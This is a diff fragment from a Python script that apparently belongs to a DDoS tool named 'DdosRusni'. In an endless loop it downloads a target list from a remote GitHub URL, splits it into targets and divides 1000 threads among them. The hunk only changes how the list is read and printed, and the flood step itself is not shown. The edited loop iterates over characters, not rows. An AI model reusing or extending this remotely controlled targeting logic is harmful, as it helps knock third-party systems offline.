@@ -30,10 +30,10 @@ while 1 == 1:
     testfile = urllib.request.urlretrieve ("https://raw.githubusercontent.com/Patonia/DdosRusni/main/target.txt", "target.txt")
     
     with open("target.txt",'r') as f:
-        print(len(f))
-        for row in f:
+        rows = f.read()
+        print (rows)
+        for row in rows:
             rrow = row.split()
-            print(row, rrow, f)
             count_targets = len(rrow)
             print(count_targets)
             count_threads = int(1000//count_targets)
